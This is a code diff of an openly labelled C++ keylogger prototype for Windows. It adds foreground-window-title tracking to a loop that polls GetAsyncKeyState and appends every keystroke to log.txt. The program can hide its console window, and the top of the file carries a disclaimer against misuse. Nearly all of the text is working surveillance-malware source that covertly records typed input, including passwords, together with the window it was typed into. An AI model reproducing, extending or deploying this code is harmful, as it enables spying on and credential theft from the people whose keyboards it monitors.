@@ -1,5 +1,5 @@
 /*
-C++ Prototype Keylogger using GetAsyncKeyState and GetKeyState
+C++ Prototype Keylogger using GetAsyncKeyState, GetKeyState and GetWindowText
 Created by Martin Georgiev, geeorgiev[at]gmail.com
 
 DISCLAIMER: THE AUTHOR DOES NOT CONDONE THE USE OF THIS PROGRAM FOR ANY
@@ -19,17 +19,43 @@ Please, do not do anything stupid & don't be evil!
 #include <stdlib.h>
 #include <iostream>
 #include <fstream>
+#include <string>
 
 using namespace std;
 
+// GLOBAL Variables
 // Choose whether console window should be visible for debug
 const bool DEBUG = true; 
 
 std::string key;
+std::string bullet = ">---------------------------------------------------\n\n";
+
 // Activated after Shift is pressed
-bool hookShift(); 
+bool catchShift(); 
 // Checks for CapsLock activation
-bool capsLock(); 
+bool capsLock();
+
+// Window handlers
+void saveLastHWND();
+bool isSameHWND();
+LPWSTR HWNDName;
+LPWSTR lastHWND;
+
+
+// Main handle
+int main()
+{
+	saveLastHWND();
+	PWinTitle(lastHWND);
+
+	if (!DEBUG) {
+		ShowWindow(GetConsoleWindow(), SW_HIDE);
+	}
+
+	user32();
+
+	return 0;
+}
 
 /*
 Storing keyboard data in a log.txt file
@@ -47,9 +73,33 @@ void log(string input) {
 	}
 }
 
+void saveLastHWND() {
+	HWND hwnd = GetForegroundWindow();
+	int buffsize = GetWindowTextLength(hwnd) + 1;
+	lastHWND = new WCHAR[buffsize];
+	int window = GetWindowText(hwnd, lastHWND, buffsize);
+}
 
-bool SpecialKeys(int S_Key) {
-	if (hookShift()) {
+bool isSameHWND() {
+	HWND hwnd = GetForegroundWindow();
+	int buffsize = GetWindowTextLength(hwnd) + 1;
+	HWNDName = new WCHAR[buffsize];
+	int window = GetWindowText(hwnd, HWNDName, buffsize);
+
+	// Debug for windows title memory
+	// wcout << windowName << endl;
+	// wcout << lastWindow << endl;
+	if (wcscmp(HWNDName,lastHWND) == 0) {
+		return true;
+	}
+	else {
+		return false;
+	}
+}
+
+
+bool SKeyHook(int S_Key) {
+	if (catchShift()) {
 		switch (S_Key) {
 			case '1': key = '!'; break;
 			case '2': key = '@'; break;
@@ -98,39 +148,64 @@ bool SpecialKeys(int S_Key) {
 
 
 bool capsLock() {
-	if (GetKeyState(VK_CAPITAL) == 1) { return true; }
-	if (GetKeyState(VK_CAPITAL) == -127) { return true; }
+	if (GetKeyState(VK_CAPITAL) == 1) { 
+		return true; 
+	}
+	if (GetKeyState(VK_CAPITAL) == -127) { 
+		return true;
+	}
 	return false;
 }
 
 
-bool hookShift() {
-	//cout << "LEFT SHIFT: " << GetKeyState(VK_LSHIFT);
-	//cout << "RIGHT SHIFT: " << GetKeyState(VK_RSHIFT) <<endl;
-	//cout << "SHIFT:  ";
-	//cout << "CAPITAL: " << GetKeyState(VK_CAPITAL) <<endl;
-
-	if (GetKeyState(VK_LSHIFT) < -120) { return true; }
-	if (GetKeyState(VK_RSHIFT) < -120) { return true; }
-
+bool catchShift() {
+	if (GetKeyState(VK_LSHIFT) < -120) {
+		return true;
+	}
+	if (GetKeyState(VK_RSHIFT) < -120) {
+		return true;
+	}
 	return false;
 }
 
+std::string MBFromW(LPCWSTR pwsz, UINT cp) {
+	int cch = WideCharToMultiByte(cp, 0, pwsz, -1, 0, 0, NULL, NULL);
 
-int main()
-{
-	if (!DEBUG) {
-		ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char* psz = new char[cch];
+
+	WideCharToMultiByte(cp, 0, pwsz, -1, psz, cch, NULL, NULL);
+
+	std::string st(psz);
+	delete[] psz;
+
+	return st;
+}
+
+void PWinTitle(LPWSTR text) {
+
+	std::string test = MBFromW(text, 0);
+
+	if (DEBUG) {
+		wprintf(L"\n\n >>> %s \n", text);
+		cout << bullet;
 	}
 	
-	char KEY_PRESS = 'x';
+	log("\n\n >>> "+test+"\n"+ bullet);
+}
 
+void user32() {
+	char KEY_PRESS = 'x';
 	while (true) {
 		Sleep(10);
 		for (int KEY_PRESS = 8; KEY_PRESS <= 190; KEY_PRESS++)
 		{
 			if (GetAsyncKeyState(KEY_PRESS) == -32767) {
-				if (SpecialKeys(KEY_PRESS) == false) {
+				if (!isSameHWND()) {
+					PWinTitle(HWNDName);
+				}
+				saveLastHWND();
+
+				if (SKeyHook(KEY_PRESS) == false) {
 					if ((KEY_PRESS == 1) ||
 						(KEY_PRESS == 2) ||
 						(KEY_PRESS == 16) ||
@@ -148,20 +223,21 @@ int main()
 					fstream LogFile;
 					LogFile.open("log.txt", fstream::app);
 					if (LogFile.is_open()) {
-						if ((KEY_PRESS >= 48 && KEY_PRESS <=57) || 
+						if ((KEY_PRESS >= 48 && KEY_PRESS <= 57) ||
 							GetAsyncKeyState(VK_SHIFT) ||
 							GetKeyState(VK_CAPITAL)) {
-								LogFile << char(KEY_PRESS);
-								if (DEBUG) {
-									cout << char(KEY_PRESS);
-								}
-						} else {
-							LogFile << char(KEY_PRESS+32);
+							LogFile << char(KEY_PRESS);
 							if (DEBUG) {
-								cout << char(KEY_PRESS+32);
+								cout << char(KEY_PRESS);
 							}
 						}
-						
+						else {
+							LogFile << char(KEY_PRESS + 32);
+							if (DEBUG) {
+								cout << char(KEY_PRESS + 32);
+							}
+						}
+
 						LogFile.close();
 					}
 
@@ -169,6 +245,4 @@ int main()
 			}
 		}
 	}
-
-	return 0;
 }
